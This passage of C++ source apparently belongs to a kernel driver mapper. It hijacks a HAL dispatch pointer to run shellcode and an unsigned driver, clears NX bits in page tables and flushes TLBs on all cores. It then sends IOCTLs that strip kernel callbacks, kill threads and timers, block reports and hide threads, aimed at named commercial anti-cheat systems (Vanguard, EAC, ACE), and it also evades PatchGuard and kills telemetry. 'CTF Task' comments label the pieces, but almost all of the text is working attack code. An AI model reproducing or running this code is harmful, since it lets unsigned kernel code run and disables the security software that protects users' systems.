    //   add rsp,28h / xor eax,eax / ret
    //
    // originalHalValue and halKernelVA are patched in later (see HAL patch block).
    uint8_t stub[] = {
        0x48,0x83,0xEC,0x28,                      // sub rsp, 28h
        0x48,0xB9,0,0,0,0,0,0,0,0,                // mov rcx, DriverObject [patch offset 6]
        0x48,0x31,0xD2,                            // xor rdx, rdx
        0x48,0xB8,0,0,0,0,0,0,0,0,                // mov rax, entryPoint [patch offset 19]
        0xFF,0xD0,                                 // call rax
        0x48,0xB8,0,0,0,0,0,0,0,0,                // mov rax, originalHalValue [patch offset 31]
        0x48,0xB9,0,0,0,0,0,0,0,0,                // mov rcx, halKernelVA [patch offset 41]
        0x48,0x89,0x01,                            // mov [rcx], rax
        0x48,0x83,0xC4,0x28,                       // add rsp, 28h
        0x31,0xC0,                                 // xor eax, eax
        0xC3                                       // ret
    };
    memcpy(&stub[6],  &rcxVal,            8);
    memcpy(&stub[19], &result.entryPoint, 8);

    uint64_t stubVA = prim.AllocateKernelMemory(128);
    if (!stubVA) { Log("Kernel alloc for trampoline failed\n"); return 1; }
    if (!prim.WriteKernelMemory(stubVA, stub, sizeof(stub))) {
        Log("Write trampoline failed\n"); return 1;
    }
    Log("Trampoline  : 0x%llx (entryPoint=0x%llx)\n",
        (unsigned long long)stubVA, (unsigned long long)result.entryPoint);

    // ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE) returns pool with NX bit SET on some
    // Win10 22H2 builds — BSOD 0x50 / P2=0x11 (NX present-page execute violation).
    // On x64, effective NX = OR of XD bits across ALL paging levels (PTE, PDE, PDPTE,
    // PML4E).  Clearing NX at only the leaf level is insufficient — if ANY parent has
    // XD=1, execution still faults.  Walk ALL levels and clear XD at each.
    auto ClearNxPage = [&](uint64_t va) -> bool {
        bool cleared = false;

        // Level 1: PTE
        uint64_t pteAddr = pteBase + ((va >> 9) & 0x7FFFFFFFF8ULL);
        uint64_t origPte = 0;
        if (prim.ReadKernelMemory(&origPte, pteAddr, 8) && (origPte & 1)) {
            uint64_t newPte = origPte & ~(1ULL << 63);
            if (newPte != origPte) {
                prim.WriteKernelMemory(pteAddr, &newPte, 8);
                Log("NX cleared PTE: va=0x%llx 0x%llx->0x%llx\n",
                    (unsigned long long)va, (unsigned long long)origPte,
                    (unsigned long long)newPte);
            }
            cleared = true;
        }

        // Level 2: PDE (covers 2MB; may be large page PS=1 or page-table pointer)
        uint64_t pdeAddr = pteBase + ((pteAddr >> 9) & 0x7FFFFFFFF8ULL);
        uint64_t origPde = 0;
        if (prim.ReadKernelMemory(&origPde, pdeAddr, 8) && (origPde & 1)) {
            uint64_t newPde = origPde & ~(1ULL << 63);
            if (newPde != origPde) {
                prim.WriteKernelMemory(pdeAddr, &newPde, 8);
                Log("NX cleared PDE: va=0x%llx 0x%llx->0x%llx%s\n",
                    (unsigned long long)va, (unsigned long long)origPde,
                    (unsigned long long)newPde,
                    (origPde & (1ULL << 7)) ? " [2M large]" : "");
            }
            cleared = true;
        }

        // Level 3: PDPTE (covers 1GB; may be huge page PS=1 or page-directory pointer)
        uint64_t pdpteAddr = pteBase + ((pdeAddr >> 9) & 0x7FFFFFFFF8ULL);
        uint64_t origPdpte = 0;
        if (prim.ReadKernelMemory(&origPdpte, pdpteAddr, 8) && (origPdpte & 1)) {
            uint64_t newPdpte = origPdpte & ~(1ULL << 63);
            if (newPdpte != origPdpte) {
                prim.WriteKernelMemory(pdpteAddr, &newPdpte, 8);
                Log("NX cleared PDPTE: va=0x%llx 0x%llx->0x%llx%s\n",
                    (unsigned long long)va, (unsigned long long)origPdpte,
                    (unsigned long long)newPdpte,
                    (origPdpte & (1ULL << 7)) ? " [1G huge]" : "");
            }
            cleared = true;
        }

        // Level 4: PML4E (covers 512GB)
        uint64_t pml4eAddr = pteBase + ((pdpteAddr >> 9) & 0x7FFFFFFFF8ULL);
        uint64_t origPml4e = 0;
        if (prim.ReadKernelMemory(&origPml4e, pml4eAddr, 8) && (origPml4e & 1)) {
            uint64_t newPml4e = origPml4e & ~(1ULL << 63);
            if (newPml4e != origPml4e) {
                prim.WriteKernelMemory(pml4eAddr, &newPml4e, 8);
                Log("NX cleared PML4E: va=0x%llx 0x%llx->0x%llx\n",
                    (unsigned long long)va, (unsigned long long)origPml4e,
                    (unsigned long long)newPml4e);
            }
            cleared = true;
        }

        if (!cleared)
            Log("NX: va=0x%llx not present at any level\n", (unsigned long long)va);
        return cleared;
    };

    // Get imageSize from the raw PE headers
    size_t imageSize = 0;
    {
        auto* dosH = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
        auto* ntH  = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
                         image.data() + dosH->e_lfanew);
        imageSize = ntH->OptionalHeader.SizeOfImage;
    }
    // NtQIP needed for both TLB flush below and DriverEntry trigger
    auto NtQIP = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG,PULONG)>(
        GetProcAddress(hNtdll, "NtQueryIntervalProfile"));

    // Clear NX for all image pages and trampoline page
    for (uint64_t off = 0; off < imageSize; off += 0x1000)
        ClearNxPage(result.imageBase + off);
    ClearNxPage(stubVA);
    Log("NX pass done for image (%zu bytes) + trampoline\n", imageSize);

    // ── Cross-core TLB flush ───────────────────────────────────────────────────
    //
    // After clearing NX on all image + trampoline pages, every core's TLB may
    // still hold stale entries with XD=1.  We need a full global TLB flush on
    // ALL cores before executing.
    //
    // Strategy (ordered by preference):
    //
    //   PRIMARY — KeFlushEntireTb:
    //     Windows' own all-core global TLB flush.  Internally sends IPI to every
    //     core and toggles CR4.PGE or issues INVPCID as appropriate for the CPU.
    //     This is safer than manual CR4 writes (PatchGuard monitors CR4 directly
    //     but trusts calls through KeFlushEntireTb).  It handles both Global and
    //     non-Global page entries, and works correctly under Hyper-V / EPT.
    //
    //   FALLBACK — KeIpiGenericCall + CR4.PGE toggle:
    //     Only if KeFlushEntireTb is unavailable (pre-RS1 builds).  We write IPI
    //     callback shellcode that clears CR4.PGE then restores it.  Riskier
    //     because PatchGuard may flag the CR4 write, but necessary on old builds.
    //
    // We invoke the flush TWICE with a 1ms gap — the second pass catches any
    // TLB entries that were reloaded by concurrent kernel activity between the
    // first flush and our post-flush pre-touch.

    auto FlushTLBAllCores = [&](const char* reason) -> bool {
        HMODULE hNtos2 = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!hNtos2) { Log("TLB flush: LoadLibrary ntoskrnl failed\n"); return false; }

        FARPROC flushFn  = GetProcAddress(hNtos2, "KeFlushEntireTb");
        FARPROC ipiGenFn = GetProcAddress(hNtos2, "KeIpiGenericCall");
        bool flushed = false;

        // PRIMARY: KeFlushEntireTb — documented, safe, handles all page sizes
        if (flushFn) {
            uint64_t flushKva = kernelBase +
                (reinterpret_cast<uint64_t>(flushFn) - reinterpret_cast<uint64_t>(hNtos2));

            // Shellcode: sub rsp,28h / xor ecx,ecx / mov rax,flushKva / call rax /
            //            add rsp,28h / xor eax,eax / ret
            uint8_t flushSc[] = {
                0x48,0x83,0xEC,0x28,                    // sub rsp, 28h
                0x31,0xC9,                               // xor ecx, ecx
                0x48,0xB8,0,0,0,0,0,0,0,0,              // mov rax, flushKva
                0xFF,0xD0,                               // call rax
                0x48,0x83,0xC4,0x28,                    // add rsp, 28h
                0x31,0xC0,                               // xor eax, eax
                0xC3                                     // ret
            };
            memcpy(&flushSc[8], &flushKva, 8);

            if (sizeof(flushSc) > caveSize) {
                Log("TLB flush: cave too small for flush shellcode (%zu > %zu)\n",
                    sizeof(flushSc), caveSize);
            } else {
                uint8_t origCaveFlush[32] = {};
                prim.ReadKernelMemory(origCaveFlush, caveKVA, sizeof(flushSc));
                prim.WriteKernelMemory(caveKVA, flushSc, sizeof(flushSc));
                uint64_t origHal = 0;
                prim.ReadKernelMemory(&origHal, halKernelVA, 8);
                prim.WriteKernelMemory(halKernelVA, &caveKVA, 8);
                ULONG ign = 0;
                SafeNtQIP(NtQIP, 0x0, &ign);
                prim.WriteKernelMemory(halKernelVA, &origHal, 8);
                prim.WriteKernelMemory(caveKVA, origCaveFlush, sizeof(flushSc));
                Log("TLB flushed via KeFlushEntireTb (%s) KVA=0x%llx\n",
                    reason, (unsigned long long)flushKva);
                flushed = true;
            }
        }

        // FALLBACK: KeIpiGenericCall + CR4.PGE toggle
        if (!flushed && ipiGenFn) {
            uint64_t ipiKva = kernelBase +
                (reinterpret_cast<uint64_t>(ipiGenFn) - reinterpret_cast<uint64_t>(hNtos2));

            // IPI callback: toggle CR4.PGE to flush global TLB entries on each core
            uint8_t ipiCb[] = {
                0x0F,0x20,0xE0,                 // mov rax, cr4
                0x48,0x89,0xC1,                 // mov rcx, rax
                0x25,0x7F,0xFF,0xFF,0xFF,       // and eax, ~PGE
                0x0F,0x22,0xE0,                 // mov cr4, rax
                0x0F,0x22,0xE1,                 // mov cr4, rcx
                0x48,0x31,0xC0,                 // xor rax, rax
                0xC3                            // ret
            };

            // HAL shellcode: call KeIpiGenericCall(caveKVA, 0)
            uint64_t ipiCbKva = caveKVA;
            uint64_t halScKva = caveKVA + 48;
            size_t totalSize = 48 + 48;  // IPI callback + HAL dispatch

            if (totalSize > caveSize) {
                Log("TLB flush: cave too small for IPI shellcode (%zu > %zu)\n",
                    totalSize, caveSize);
            } else {
                uint8_t halSc[48] = {};
                uint8_t* hp = halSc;
                auto hw1 = [&](uint8_t  v) { *hp++ = v; };
                auto hw8 = [&](uint64_t v) { memcpy(hp, &v, 8); hp += 8; };

                hw1(0x48); hw1(0x83); hw1(0xEC); hw1(0x28);
                hw1(0x48); hw1(0xB9); hw8(ipiCbKva);
                hw1(0x31); hw1(0xD2);
                hw1(0x48); hw1(0xB8); hw8(ipiKva);
                hw1(0xFF); hw1(0xD0);
                hw1(0x48); hw1(0x83); hw1(0xC4); hw1(0x28);
                hw1(0x31); hw1(0xC0);
                hw1(0xC3);

                uint8_t origCaveFlush[120] = {};
                prim.ReadKernelMemory(origCaveFlush, caveKVA, totalSize);
                prim.WriteKernelMemory(ipiCbKva, ipiCb, sizeof(ipiCb));
                prim.WriteKernelMemory(halScKva, halSc, (size_t)(hp - halSc));

                uint64_t origHal = 0;
                prim.ReadKernelMemory(&origHal, halKernelVA, 8);
                prim.WriteKernelMemory(halKernelVA, &halScKva, 8);
                ULONG ign = 0;
                SafeNtQIP(NtQIP, 0x0, &ign);
                prim.WriteKernelMemory(halKernelVA, &origHal, 8);
                prim.WriteKernelMemory(caveKVA, origCaveFlush, totalSize);
                Log("TLB flushed via KeIpiGenericCall+CR4.PGE FALLBACK (%s) IPI=0x%llx\n",
                    reason, (unsigned long long)ipiKva);
                flushed = true;
            }
        }

        if (!flushed)
            Log("TLB flush SKIPPED (%s): no flush function available\n", reason);

        FreeLibrary(hNtos2);
        return flushed;
    };

    // Double-flush: first pass evicts stale entries, second pass catches any
    // TLB fills from concurrent kernel activity during the first flush.
    FlushTLBAllCores("pass 1 of 2");
    Sleep(1);
    FlushTLBAllCores("pass 2 of 2");

    // ── Post-flush pre-warm: write+read every image page + trampoline ───────
    //
    // After the TLB flush, ALL cores have empty TLB caches.  A simple 1-byte
    // read only populates the D-TLB on the calling core.  We use a write+read
    // cycle to force a full-privilege TLB fill (W=1, XD=0) in the unified
    // STLB, then the scheduler can move our HAL dispatch trigger to ANY core
    // and it will still find the correct TLB entry.
    //
    // On bare metal, the NtQueryIntervalProfile call that triggers DriverEntry
    // may run on a DIFFERENT core than this thread.  The IPI-based TLB flush
    // already cleared all cores, but pre-warming via write ensures the L2 TLB
    // entry is loaded even if the flush and the execute end up on the same core
    // (which can happen if the entry was evicted by intervening kernel traffic).
    {
        uint32_t pagesWarmed = 0;
        uint8_t origByte = 0, marker = 0, readback = 0;

        for (uint64_t off = 0; off < imageSize; off += 0x1000) {
            uint64_t pageVA = result.imageBase + off;
            prim.ReadKernelMemory(&origByte, pageVA, 1);
            marker = origByte ^ 0xAA;
            prim.WriteKernelMemory(pageVA, &marker, 1);
            prim.ReadKernelMemory(&readback, pageVA, 1);
            prim.WriteKernelMemory(pageVA, &origByte, 1);
            pagesWarmed++;
        }
        // Trampoline page
        prim.ReadKernelMemory(&origByte, stubVA, 1);
        marker = origByte ^ 0xAA;
        prim.WriteKernelMemory(stubVA, &marker, 1);
        prim.ReadKernelMemory(&readback, stubVA, 1);
        prim.WriteKernelMemory(stubVA, &origByte, 1);
        pagesWarmed++;

        Log("Post-flush pre-warm: %u pages write+read cycled (image + trampoline)\n",
            pagesWarmed);
    }

    // Patch original HAL value and halKernelVA into the trampoline stub.
    // The stub writes the original value back to halKernelVA after DriverEntry,
    // since NalDrv IOCTLs won't work after Betest overwrites MajorFunction.
    SecurityPauseHeartbeat();

    uint64_t original = 0;
    prim.ReadKernelMemory(&original, halKernelVA, 8);
    Log("HAL orig[1] : 0x%llx\n", (unsigned long long)original);

    memcpy(&stub[31], &original,     8);
    memcpy(&stub[41], &halKernelVA,  8);
    prim.WriteKernelMemory(stubVA, stub, sizeof(stub));
    Log("Trampoline patched: originalHAL=0x%llx halKernelVA=0x%llx\n",
        (unsigned long long)original, (unsigned long long)halKernelVA);

    prim.WriteKernelMemory(halKernelVA, &stubVA, 8);
    Log("HAL patched -> stubVA, triggering DriverEntry via NtQIP...\n");

    ULONG interval2 = 0;
    NTSTATUS deSt = SafeNtQIP(NtQIP, 0x0, &interval2);
    Log("DriverEntry NtQIP: 0x%08x\n", (unsigned)deSt);

    // HAL self-restored by the trampoline (mov [rdi], rsi before ret).
    // NalDrv IOCTLs no longer work — Betest's handlers are active.
    SecurityResumeHeartbeat();
    Log("DriverEntry complete — Betest IRP handlers now active on DriverObject\n");

    // Verify driver device is accessible (try all names from the pool)
    Sleep(200);
    HANDLE hGmr = INVALID_HANDLE_VALUE;
    const char* foundName = nullptr;
    char dynBuf[64];
    for (int p = 0; p < DYN_PREFIX_COUNT && !foundName; p++) {
        for (int d = 0; d < 10 && !foundName; d++) {
            sprintf_s(dynBuf, "\\\\.\\%s%d", g_dynDevPrefixes[p], d);
            hGmr = CreateFileA(dynBuf,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (hGmr != INVALID_HANDLE_VALUE) {
                foundName = dynBuf;
            }
        }
    }
    for (int di = 0; di < STATIC_NAME_COUNT && !foundName; di++) {
        hGmr = CreateFileA(g_staticDevNames[di],
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (hGmr != INVALID_HANDLE_VALUE) {
            foundName = g_staticDevNames[di];
        }
    }
    if (foundName) {
        Log("[+] Driver device opened OK: %s\n", foundName);
        // Session auth handshake — authenticate before IOCTLs are accepted
        #define IOCTL_SESSION_AUTH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x870, METHOD_BUFFERED, FILE_ANY_ACCESS)
        ULONG64 challenge = GetTickCount64();
        ULONG64 token = 0;
        DWORD ret = 0;
        if (DeviceIoControl(hGmr, IOCTL_SESSION_AUTH,
                            &challenge, sizeof(challenge),
                            &token, sizeof(token), &ret, nullptr) && ret == sizeof(ULONG64)) {
            Log("[+] Session auth OK (token acquired)\n");
        } else {
            Log("[!] Session auth failed, err=%u\n", (unsigned)GetLastError());
        }
        CloseHandle(hGmr);
    } else {
        Log("[!] Driver device open FAILED on all names, err=%u\n", (unsigned)GetLastError());
    }

    } // end of mapping block (skipped by --update)

    skip_mapping:

    // CTF Task 51: --update mode skips mapping entirely
    if (g_updateMode) {
        Log("[*] Update mode: skipping driver mapping, connecting to existing device\n");
    }

    // ── CTF Task 4: Early load race-win for Betest ──────────────────────────
    //
    // If Betest.sys is loaded AFTER the AC driver, the image-load callback
    // can't patch the AC's DriverEntry (it already ran).  But the mapper runs
    // before the game launches, so we trigger a full AC neutralization pass
    // via the Betest driver right now — before the game/AC service starts.
    //
    // Also fire IOCTL_STRIP_CALLBACKS_ALL to do a pre-emptive callback strip
    // for any AC that may have loaded as a boot driver.
    {
        HANDLE hBetest = INVALID_HANDLE_VALUE;
        char devBuf[64];
        for (int p = 0; p < DYN_PREFIX_COUNT && hBetest == INVALID_HANDLE_VALUE; p++) {
            for (int d = 0; d < 10 && hBetest == INVALID_HANDLE_VALUE; d++) {
                sprintf_s(devBuf, "\\\\.\\%s%d", g_dynDevPrefixes[p], d);
                hBetest = CreateFileA(devBuf, GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    nullptr, OPEN_EXISTING, 0, nullptr);
            }
        }
        for (int di = 0; di < STATIC_NAME_COUNT && hBetest == INVALID_HANDLE_VALUE; di++) {
            hBetest = CreateFileA(g_staticDevNames[di], GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
        }
        if (hBetest != INVALID_HANDLE_VALUE) {
            Log("[+] Betest device opened\n");
            // Session auth handshake
            ULONG64 chal = GetTickCount64();
            ULONG64 tok = 0;
            DWORD authRet = 0;
            DeviceIoControl(hBetest, IOCTL_SESSION_AUTH,
                            &chal, sizeof(chal), &tok, sizeof(tok), &authRet, nullptr);

            DWORD ret = 0;

            // CTF Task 48: AC-specific pre-map hardening
            MapperVanguardPreMap(hBetest);
            MapperAcePreMap();
            MapperEacPreMap();

            // CTF Task 48: Post-map stealth (CR3 shuffle, DKOM, etc.)
            if (g_mapStealthFlags) {
                MapperPostMapStealth(hBetest);
            }

            // AC-targeted IOCTLs — safe (no-op when no AC modules are loaded)
            #define _IOCTL_STRIP_ALL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x81B, METHOD_BUFFERED, FILE_WRITE_DATA)
            DeviceIoControl(hBetest, _IOCTL_STRIP_ALL,
                            nullptr, 0, nullptr, 0, &ret, nullptr);
            Log("[+] Pre-emptive callback strip: sent\n");

            #define _IOCTL_KILL_TIMERS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x815, METHOD_BUFFERED, FILE_WRITE_DATA)
            DeviceIoControl(hBetest, _IOCTL_KILL_TIMERS,
                            nullptr, 0, nullptr, 0, &ret, nullptr);
            Log("[+] Pre-emptive AC timer kill: sent\n");

            #define _IOCTL_KILL_THREADS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x81A, METHOD_BUFFERED, FILE_WRITE_DATA)
            DeviceIoControl(hBetest, _IOCTL_KILL_THREADS,
                            nullptr, 0, nullptr, 0, &ret, nullptr);
            Log("[+] Pre-emptive AC thread kill: sent\n");

            #define _IOCTL_NEUTRALIZE_VGK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x820, METHOD_BUFFERED, FILE_WRITE_DATA)
            DeviceIoControl(hBetest, _IOCTL_NEUTRALIZE_VGK,
                            nullptr, 0, nullptr, 0, &ret, nullptr);
            Log("[+] Pre-emptive VGK neutralize: sent\n");

            #define _IOCTL_INLINE_HOOK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x81C, METHOD_BUFFERED, FILE_WRITE_DATA)
            DeviceIoControl(hBetest, _IOCTL_INLINE_HOOK,
                            nullptr, 0, nullptr, 0, &ret, nullptr);
            Log("[+] Pre-emptive inline hook callbacks: sent\n");

            #define _IOCTL_UNIFIED_NEUT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x827, METHOD_BUFFERED, FILE_WRITE_DATA)
            struct { ULONG Flags; ULONG RescanMs; } neutReq = { 0x0F, 5000 };
            DeviceIoControl(hBetest, _IOCTL_UNIFIED_NEUT,
                            &neutReq, sizeof(neutReq), nullptr, 0, &ret, nullptr);
            Log("[+] Unified neutralize (all ACs + 5s re-scan): sent\n");

            // Re-enabling one at a time for crash isolation
            #define _IOCTL_BMS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x840, METHOD_BUFFERED, FILE_WRITE_DATA)
            struct { ULONG BFlags; ULONG BPad; } bmsReq = { 0x03, 0 };
            DeviceIoControl(hBetest, _IOCTL_BMS,
                            &bmsReq, sizeof(bmsReq), nullptr, 0, &ret, nullptr);
            Log("[+] Bare metal stability: sent\n");

            #define _IOCTL_ANTI_DBG CTL_CODE(FILE_DEVICE_UNKNOWN, 0x83E, METHOD_BUFFERED, FILE_WRITE_DATA)
            struct { ULONG AFlags; ULONG APad; } adbReq = { 0x08, 0 };
            DeviceIoControl(hBetest, _IOCTL_ANTI_DBG,
                            &adbReq, sizeof(adbReq), nullptr, 0, &ret, nullptr);
            Log("[+] Anti-debug (anti-attach): sent\n");

            // Final Polish: kernel thread hiding (PG-unsafe — only with --dbg)
            if (g_dbgFlags) {
                #define _IOCTL_HIDE_KTHREADS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x839, METHOD_BUFFERED, FILE_WRITE_DATA)
                struct { UINT64 KPid; ULONG KFlags; ULONG KPad; } kthReq = { 0, 0x07, 0 };
                DeviceIoControl(hBetest, _IOCTL_HIDE_KTHREADS,
                                &kthReq, sizeof(kthReq), nullptr, 0, &ret, nullptr);
                Log("[+] Kernel thread hiding: sent (flags=0x%x)\n", kthReq.KFlags);
            } else {
                Log("[+] Kernel thread hiding: skipped (PG-unsafe, use --dbg to enable)\n");
            }

            // NOTE: ENCRYPT_DRV_MEM (0x83F) NOT called — XOR'ing live sections causes
            // delayed BSOD when driver globals become unreadable for future IOCTLs
            Log("[+] Driver memory encryption: skipped (destabilizes live driver)\n");

            // ── PG-unsafe features (gated by --dbg flag) ──
            #define _IOCTL_DBG_SET_FLAGS   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x841, METHOD_BUFFERED, FILE_WRITE_DATA)
            #define _IOCTL_DBG_RUN_GUARDED CTL_CODE(FILE_DEVICE_UNKNOWN, 0x843, METHOD_BUFFERED, FILE_WRITE_DATA)
            #define _IOCTL_DBG_QUERY       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x842, METHOD_BUFFERED, FILE_READ_DATA)

            #define _DBG_FEAT_DEEP_HIDE      0x01
            #define _DBG_FEAT_PG_RESIST      0x02
            #define _DBG_FEAT_KILL_TELEMETRY 0x04

            if (g_dbgFlags) {
                Log("[*] Debug mode: arming features 0x%x\n", g_dbgFlags);

                struct { DWORD EnableMask; DWORD DisableMask; } armReq = { g_dbgFlags, 0 };
                DeviceIoControl(hBetest, _IOCTL_DBG_SET_FLAGS,
                                &armReq, sizeof(armReq), nullptr, 0, &ret, nullptr);

                struct { const char* name; DWORD feat; DWORD subFlags; } features[] = {
                    { "DeepHide",       _DBG_FEAT_DEEP_HIDE,      g_dbgSubFlags },
                    { "PG_RESIST",      _DBG_FEAT_PG_RESIST,      g_dbgSubFlags },
                    { "KillTelemetry",  _DBG_FEAT_KILL_TELEMETRY, g_dbgSubFlags },
                };

                for (auto& f : features) {
                    if (!(g_dbgFlags & f.feat)) continue;

                    struct { DWORD Feature; DWORD SubFlags; UINT64 TargetPid; } runReq = { f.feat, f.subFlags, 0 };
                    struct { DWORD Feature; DWORD CompletedOps; DWORD FailedOp; LONG Result; LONG SubResults[8]; } runResp = {0};

                    BOOL ok = DeviceIoControl(hBetest, _IOCTL_DBG_RUN_GUARDED,
                                &runReq, sizeof(runReq), &runResp, sizeof(runResp), &ret, nullptr);

                    if (!ok) {
                        Log("[!] %s: DeviceIoControl failed (err=%u)\n", f.name, (unsigned)GetLastError());
                    } else if (runResp.Result == 0) {
                        Log("[+] %s: OK (completed=0x%x)\n", f.name, runResp.CompletedOps);
                    } else {
                        Log("[!] %s: FAILED (status=0x%08x, completed=0x%x, failedOp=0x%x)\n",
                            f.name, (unsigned)runResp.Result, runResp.CompletedOps, runResp.FailedOp);
                        for (int si = 0; si < 8; si++) {
                            if (runResp.SubResults[si])
                                Log("    sub[%d] = 0x%08x\n", si, (unsigned)runResp.SubResults[si]);
                        }
                    }
                }
            } else {
                Log("[+] Skipped: DeepHide, PG_RESIST, KillTelemetry (use --dbg to test)\n");
            }

            // ── CTF Task 39: EAC-style protection improvements ──
            #define _IOCTL_EAC_IMPROVE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x844, METHOD_BUFFERED, FILE_ANY_ACCESS)
            #define _IOCTL_EAC_STATUS  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x845, METHOD_BUFFERED, FILE_ANY_ACCESS)

            #define _EAC_IMP_OB_CALLBACKS  0x01
            #define _EAC_IMP_REPORT_HOOKS  0x02
            #define _EAC_IMP_CR3_SHUFFLE   0x04
            #define _EAC_IMP_HANDLE_SCRUB  0x08
            #define _EAC_IMP_MEM_EVASION   0x10
            #define _EAC_IMP_EARLY_LOAD    0x20
            #define _EAC_IMP_MINIFILTER    0x40

            if (g_eacImpFlags) {
                Log("[*] EAC improvements: applying features 0x%x (ioctl=0x%x)\n", g_eacImpFlags, _IOCTL_EAC_IMPROVE);

                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; UINT64 GamePid; } eacReq = {0};
                eacReq.Features = g_eacImpFlags;
                eacReq.TargetPid = 0;  // no specific target
                eacReq.GamePid = 0;

                // Response structure matches EAC_STATUS_RESP
                struct EacSubsysStatus { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; LONG LastResult; };
                struct {
                    DWORD ActiveFeatures; DWORD Pad;
                    EacSubsysStatus ObCallbacks;
                    EacSubsysStatus ReportHooks;
                    EacSubsysStatus Cr3Shuffle;
                    EacSubsysStatus HandleScrub;
                    EacSubsysStatus MemEvasion;
                    EacSubsysStatus EarlyLoad;
                    DWORD LearnedTagCount;
                    DWORD LearnedTags[16];
                    DWORD DonorCR3Count;
                    DWORD HandlesScrubbed;
                    DWORD CallbacksNeutralized;
                    DWORD ReportsBlocked;
                } eacResp = {0};

                Log("[*] EAC req size=%u resp size=%u\n", (unsigned)sizeof(eacReq), (unsigned)sizeof(eacResp));

                BOOL ok = DeviceIoControl(hBetest, _IOCTL_EAC_IMPROVE,
                            &eacReq, sizeof(eacReq), &eacResp, sizeof(eacResp), &ret, nullptr);

                if (!ok) {
                    Log("[!] EAC improve: DeviceIoControl failed (err=%u)\n",
                        (unsigned)GetLastError());
                } else {
                    Log("[+] EAC improve: active=0x%x\n", eacResp.ActiveFeatures);

                    struct { const char* name; DWORD flag; EacSubsysStatus* ss; bool needsPid; } subs[] = {
                        { "OB Callbacks",  _EAC_IMP_OB_CALLBACKS,  &eacResp.ObCallbacks,  false },
                        { "Report Hooks",  _EAC_IMP_REPORT_HOOKS,  &eacResp.ReportHooks,  false },
                        { "CR3 Shuffle",   _EAC_IMP_CR3_SHUFFLE,   &eacResp.Cr3Shuffle,   true  },
                        { "Handle Scrub",  _EAC_IMP_HANDLE_SCRUB,  &eacResp.HandleScrub,  true  },
                        { "Mem Evasion",   _EAC_IMP_MEM_EVASION,   &eacResp.MemEvasion,   false },
                        { "Early Load",    _EAC_IMP_EARLY_LOAD,    &eacResp.EarlyLoad,    false },
                        { "MiniFilter",    _EAC_IMP_MINIFILTER,    NULL,                  false },
                    };

                    for (auto& s : subs) {
                        if (!(g_eacImpFlags & s.flag)) continue;
                        if (!s.ss) {
                            Log("[+]   %s: requested (no per-subsystem status)\n", s.name);
                            continue;
                        }
                        if (!s.ss->Enabled) {
                            Log("[-]   %s: not enabled\n", s.name);
                        } else if (s.ss->LastResult == 0) {
                            if (s.ss->ItemsProcessed > 0) {
                                Log("[+]   %s: OK (items=%u, runs=%u, success=%u)\n",
                                    s.name, s.ss->ItemsProcessed, s.ss->RunCount, s.ss->SuccessCount);
                            } else if (s.needsPid && !eacReq.TargetPid) {
                                Log("[~]   %s: SKIPPED (needs target PID)\n", s.name);
                            } else {
                                Log("[~]   %s: OK but 0 items (no AC modules loaded)\n", s.name);
                            }
                        } else {
                            Log("[!]   %s: FAILED (status=0x%08x, items=%u, fails=%u)\n",
                                s.name, (unsigned)s.ss->LastResult, s.ss->ItemsProcessed, s.ss->FailCount);
                        }
                    }

                    Log("[*]   --- Aggregate counters ---\n");
                    Log("[*]   Callbacks neutralized: %u\n", eacResp.CallbacksNeutralized);
                    Log("[*]   Handles scrubbed: %u\n", eacResp.HandlesScrubbed);
                    Log("[*]   Reports blocked: %u\n", eacResp.ReportsBlocked);
                    Log("[*]   Donor CR3s: %u\n", eacResp.DonorCR3Count);
                    Log("[*]   Learned tags: %u\n", eacResp.LearnedTagCount);
                }
            } else {
                Log("[+] Skipped: EAC improvements (use --eac 3f to test)\n");
            }

            // CTF Task 42: ACE-style protection strengthening
            #define _IOCTL_ACE_STRENGTHEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x846, METHOD_BUFFERED, FILE_ANY_ACCESS)

            #define _ACE_STR_CALLBACKS   0x01
            #define _ACE_STR_DPC_KILL    0x02
            #define _ACE_STR_HV_EVASION  0x04
            #define _ACE_STR_EARLY_LOAD  0x08
            #define _ACE_STR_CR3_DKOM    0x10
            #define _ACE_STR_MEM_EVASION 0x20

            if (g_aceStrFlags) {
                Log("[*] ACE strengthen: applying features 0x%x (ioctl=0x%x)\n", g_aceStrFlags, _IOCTL_ACE_STRENGTHEN);

                struct { DWORD Features; DWORD Flags; UINT64 TargetPid; UINT64 GamePid; } aceReq = {0};
                aceReq.Features = g_aceStrFlags;
                aceReq.TargetPid = 0;
                aceReq.GamePid = 0;

                struct EacSubsysStatus2 { DWORD Enabled; DWORD RunCount; DWORD SuccessCount; DWORD FailCount; DWORD ItemsProcessed; LONG LastResult; };
                struct {
                    DWORD ActiveFeatures; DWORD Pad;
                    EacSubsysStatus2 Callbacks;
                    EacSubsysStatus2 DpcKill;
                    EacSubsysStatus2 HvEvasion;
                    EacSubsysStatus2 EarlyLoad;
                    EacSubsysStatus2 Cr3Dkom;
